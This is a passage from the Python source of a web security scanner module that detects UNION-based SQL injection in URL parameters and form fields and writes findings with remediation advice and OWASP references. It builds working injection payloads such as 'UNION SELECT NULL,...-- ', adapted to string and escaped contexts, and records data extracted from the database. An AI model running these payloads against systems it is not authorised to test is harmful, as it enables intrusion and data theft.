                f"to extract data from the database by appending UNION queries. "
                f"Detected {num_columns} columns in the original query."
            )
        
        if injectable_columns:
            description += f" Injectable columns: {injectable_columns}."
        
        if extracted_info:
            description += f" Extracted information: {', '.join(extracted_info.keys())}."
        
        recommendation = (
            f"Use parameterized queries (prepared statements) to prevent SQL injection. "
            f"Never concatenate user input directly into SQL queries. "
            f"Implement strict input validation and sanitization. "
            f"Apply the principle of least privilege to database accounts. "
            f"Consider using an ORM framework that prevents SQL injection by design."
        )
        
        evidence_value = (
            f"UNION SELECT confirmed with {num_columns} columns. "
        )
        
        if injectable_columns:
            evidence_value += f"Injectable columns: {injectable_columns}. "
        
        if extracted_info:
            info_summary = ', '.join([f"{k}={v}" for k, v in extracted_info.items()])
            evidence_value += f"Extracted: {info_summary}."
        else:
            evidence_value += "Data extraction capability confirmed."
        
        nulls = ','.join(['NULL'] * num_columns)
        
        # Build context-aware payload example
        if string_context:
            payload_example = f"{original_value}' UNION SELECT {nulls}-- "
            context_note = " (string context payload - closes quote)"
        elif has_escaping:
            payload_example = f"{original_value} UNION SELECT {nulls}#"
            context_note = " (numeric payload due to mysqli_real_escape_string)"
        else:
            payload_example = f"-1 UNION SELECT {nulls}#"
            context_note = " (numeric context payload)"
        
        evidence = {
            'type': 'union_based',
            'value': evidence_value,
            'context': f"{method} request to {url}{context_note}",
            'method': method,
            'url': url,
            'parameter': parameter,
            'original_value': original_value,
            'columns_detected': num_columns,
            'injectable_columns': injectable_columns,
            'extracted_information': extracted_info,
            'union_payload_example': payload_example,
            'escaping_detected': has_escaping,
            'numeric_context': is_numeric,
            'string_context': string_context
        }
        
        references = [
            'https://owasp.org/www-community/attacks/SQL_Injection',
            'https://portswigger.net/web-security/sql-injection/union-attacks',
            'https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html',
            'https://cwe.mitre.org/data/definitions/89.html'
        ]
        
        severity = 'critical'
        confidence = 'high'
        
        finding = {
            'id': finding_id,
            'title': title,
            'description': description,
            'severity': severity,
            'confidence': confidence,
            'recommendation': recommendation,
            'evidence': evidence,
            'references': references,
            'affected_component': f"{method} {url} (parameter: {parameter})",
            'timestamp': datetime.now(timezone.utc).isoformat(),
            'detection_method': 'union-based'
        }
        
        return finding
    
    def test_form(
        self,
        form: Dict,
        form_tester
    ) -> List[Dict]:
        """Test a form for UNION-based SQLi."""
        findings = []
        
        testable_inputs = form_tester.get_testable_inputs(form)
        
        if not testable_inputs:
            return findings
        
        logger.info(f"Testing UNION-based on form: {form['method'].upper()} {form['action']} ({len(testable_inputs)} inputs)")
        
        for input_field in testable_inputs:
            field_name = input_field['name']
            field_value = input_field.get('value', '')
            
            if not field_value or field_value.strip() == '':
                field_value = '1'
                logger.debug(f"  Field '{field_name}' has no value, using default '1'")
            
            logger.debug(f"  Testing form field: {field_name}={field_value}")
            
            all_form_data = {}
            for inp in form.get('inputs', []):
                all_form_data[inp['name']] = inp.get('value', '')
            
            field_findings = self.test_url_parameter(
                base_url=form['action'],
                param_name=field_name,
                original_value=field_value,
                all_params=all_form_data,
                method=form['method']
            )
            
            for finding in field_findings:
                finding['evidence']['form_context'] = form_tester.extract_form_context(form)
                finding['description'] = finding['description'].replace(
                    "URL parameter",
                    f"form field (in {form_tester.extract_form_context(form)})"
                )
            
            findings.extend(field_findings)
        
        return findings
    
    def scan(self, urls_with_params: List[Dict], forms: List[Dict]) -> List[Dict]:
        """
        Scan URLs and forms for UNION-based SQL injection.
        """
        findings = []
        
        logger.info("=" * 70)
        logger.info("UNION-BASED SCAN")
        logger.info("  SQL context verification: ENABLED")
        logger.info("  String context detection: ENABLED")
        logger.info("  Baseline comparison: ENABLED")
        logger.info("  Smart column enumeration: ENABLED")
        logger.info("  Data extraction verification: REQUIRED")
        logger.info("  False positive rate target: 0%")
        logger.info("  URL merging: ENABLED (imported from forms.py)")
        logger.info("=" * 70)
        
        logger.info(f"Starting UNION-based SQL injection scan")
        logger.info(f"  URLs to test: {len(urls_with_params)}")
        logger.info(f"  Forms to test: {len(forms)}")
        
        CONTROL_PARAMS = [
            'submit', 'csrf', 'token', '_token',
            'authenticity', 'xsrf', 'security_token',
            'form_token', 'request_token', 'anti_csrf'
        ]
        
        # Test URL parameters (GET)
        for url_dict in urls_with_params:
            base_url = url_dict['base_url']
            params = url_dict['parameters']
            testable_params = url_dict.get('testable_params', params)
            
            is_path_param = url_dict.get('is_path_param', False)
            
            logger.info(f"Testing URL (GET): {base_url}")
            
            for param_name, param_value in testable_params.items():
                if param_name.lower() in CONTROL_PARAMS:
                    logger.debug(f"  Skipping control parameter: {param_name}")
                    continue
                
                param_findings = self.test_url_parameter(
                    base_url,
                    param_name,
                    param_value,
                    all_params=params,
                    method='GET',
                    url_metadata=url_dict
                )
                findings.extend(param_findings)
        
        # Test forms (POST/GET)
        if forms:
            from .forms import FormTester
            form_tester = FormTester(self.config, self.http, self.auto_csrf)
            
            for form in forms:
                form_findings = self.test_form(form, form_tester)
                findings.extend(form_findings)
        
        logger.info(f"UNION-based scan complete: {len(findings)} vulnerabilities found")
        
        return findings


if __name__ == '__main__':
    from ..core.config import Config
    from ..core.http_client import create_http_client
    
    config = Config.load()
    http_client = create_http_client(mode='aggressive', config=config)
    
    detector = UnionBasedDetector(config, http_client)
    print(f"Max columns: {detector.max_columns}")
    print(f"Extract info: {detector.extract_info}")
    print(f"String context detection: ENABLED")
    print(f"False positive prevention: ENABLED")
    print(f"URL merging: ENABLED")
